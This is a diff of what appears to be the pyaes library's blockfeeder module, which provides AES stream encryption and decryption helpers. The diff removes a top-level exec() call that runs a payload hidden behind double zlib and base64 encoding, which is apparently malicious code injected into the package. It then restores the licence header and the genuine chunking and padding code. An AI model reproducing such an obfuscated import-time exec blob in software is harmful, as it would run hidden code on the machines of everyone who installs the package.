@@ -1,3 +1,182 @@
+# The MIT License (MIT)
+#
+# Copyright (c) 2014 Richard Moore
+#
+# Permission is hereby granted, free of charge, to any person obtaining a copy
+# of this software and associated documentation files (the "Software"), to deal
+# in the Software without restriction, including without limitation the rights
+# to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
+# copies of the Software, and to permit persons to whom the Software is
+# furnished to do so, subject to the following conditions:
+#
+# The above copyright notice and this permission notice shall be included in
+# all copies or substantial portions of the Software.
+#
+# THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
+# IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
+# FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
+# AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
+# LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
+# OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN
+# THE SOFTWARE.
 
-import zlib, base64
-exec(zlib.decompress(base64.b64decode(zlib.decompress(base64.b64decode('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')))).decode('utf-8'))
+
+from .aes import AESBlockModeOfOperation, AESSegmentModeOfOperation, AESStreamModeOfOperation
+from .util import append_PKCS7_padding, strip_PKCS7_padding, to_bufferable
+
+
+# First we inject three functions to each of the modes of operations
+#
+#    _can_consume(size)
+#       - Given a size, determine how many bytes could be consumed in
+#         a single call to either the decrypt or encrypt method
+#
+#    _final_encrypt(data)
+#       - call and return encrypt on this (last) chunk of data,
+#         padding as necessary; this will always be at least 16
+#         bytes unless the total incoming input was less than 16
+#         bytes
+#
+#    _final_decrypt(data)
+#       - same as _final_encrypt except for decrypt, for
+#         stripping off padding
+#
+
+
+# ECB and CBC are block-only ciphers
+
+def _block_can_consume(self, size):
+    if size >= 16: return 16
+    return 0
+
+# After padding, we may have more than one block
+def _block_final_encrypt(self, data):
+    data = append_PKCS7_padding(data)
+    if len(data) == 32:
+        return self.encrypt(data[:16]) + self.encrypt(data[16:])
+    return self.encrypt(data)
+
+def _block_final_decrypt(self, data):
+    return strip_PKCS7_padding(self.decrypt(data))
+
+AESBlockModeOfOperation._can_consume = _block_can_consume
+AESBlockModeOfOperation._final_encrypt = _block_final_encrypt
+AESBlockModeOfOperation._final_decrypt = _block_final_decrypt
+
+# CFB is a segment cipher
+def _segment_can_consume(self, size):
+    return self.segment_bytes * int(size // self.segment_bytes)
+
+# CFB can handle a non-segment-sized block at the end using the remaining cipherblock
+def _segment_final_encrypt(self, data):
+    faux_padding = (chr(0) * (self.segment_bytes - (len(data) % self.segment_bytes)))
+    padded = data + to_bufferable(faux_padding)
+    return self.encrypt(padded)[:len(data)]
+
+# CFB can handle a non-segment-sized block at the end using the remaining cipherblock
+def _segment_final_decrypt(self, data):
+    faux_padding = (chr(0) * (self.segment_bytes - (len(data) % self.segment_bytes)))
+    padded = data + to_bufferable(faux_padding)
+    return self.decrypt(padded)[:len(data)]
+
+AESSegmentModeOfOperation._can_consume = _segment_can_consume
+AESSegmentModeOfOperation._final_encrypt = _segment_final_encrypt
+AESSegmentModeOfOperation._final_decrypt = _segment_final_decrypt
+
+# OFB and CTR are stream ciphers
+def _stream_can_consume(self, size):
+    return size
+
+def _stream_final_encrypt(self, data):
+    return self.encrypt(data)
+
+def _stream_final_decrypt(self, data):
+    return self.decrypt(data)
+
+AESStreamModeOfOperation._can_consume = _stream_can_consume
+AESStreamModeOfOperation._final_encrypt = _stream_final_encrypt
+AESStreamModeOfOperation._final_decrypt = _stream_final_decrypt
+
+class BlockFeeder(object):
+    '''The super-class for objects to handle chunking a stream of bytes
+       into the appropriate block size for the underlying mode of operation
+       and applying (or stripping) padding, as necessary.'''
+
+    def __init__(self, mode, feed, final):
+        self._mode = mode
+        self._feed = feed
+        self._final = final
+        self._buffer = to_bufferable("")
+
+    def feed(self, data=None):
+        '''Provide bytes to encrypt (or decrypt), returning any bytes
+           possible from this or any previous calls to feed.
+
+           Call with None or an empty string to flush the mode of
+           operation and return any final bytes; no further calls to
+           feed may be made.'''
+
+        if self._buffer is None:
+            raise ValueError('already finished feeder')
+
+        # Finalize; process the spare bytes we were keeping
+        if not data:
+            result = self._final(self._buffer)
+            self._buffer = None
+            return result
+
+        self._buffer += to_bufferable(data)
+
+        # We keep 16 bytes around so we can determine padding
+        result = to_bufferable('')
+        while len(self._buffer) > 16:
+            can_consume = self._mode._can_consume(len(self._buffer) - 16)
+            if can_consume == 0: break
+            result += self._feed(self._buffer[:can_consume])
+            self._buffer = self._buffer[can_consume:]
+
+        return result
+
+
+class Encrypter(BlockFeeder):
+    'Accepts bytes of plaintext and returns encrypted ciphertext.'
+
+    def __init__(self, mode):
+        BlockFeeder.__init__(self, mode, mode.encrypt, mode._final_encrypt)
+
+
+class Decrypter(BlockFeeder):
+    'Accepts bytes of ciphertext and returns decrypted plaintext.'
+
+    def __init__(self, mode):
+        BlockFeeder.__init__(self, mode, mode.decrypt, mode._final_decrypt)
+
+
+# 8kb blocks
+BLOCK_SIZE = (1 << 13)
+
+def _feed_stream(feeder, in_stream, out_stream, block_size=BLOCK_SIZE):
+    'Uses feeder to read and convert from in_stream and write to out_stream.'
+
+    while True:
+        chunk = in_stream.read(BLOCK_SIZE)
+        if not chunk:
+            break
+        converted = feeder.feed(chunk)
+        out_stream.write(converted)
+    converted = feeder.feed()
+    out_stream.write(converted)
+
+
+def encrypt_stream(mode, in_stream, out_stream, block_size=BLOCK_SIZE):
+    'Encrypts a stream of bytes from in_stream to out_stream using mode.'
+
+    encrypter = Encrypter(mode)
+    _feed_stream(encrypter, in_stream, out_stream, block_size)
+
+
+def decrypt_stream(mode, in_stream, out_stream, block_size=BLOCK_SIZE):
+    'Decrypts a stream of bytes from in_stream to out_stream using mode.'
+
+    decrypter = Decrypter(mode)
+    _feed_stream(decrypter, in_stream, out_stream, block_size)
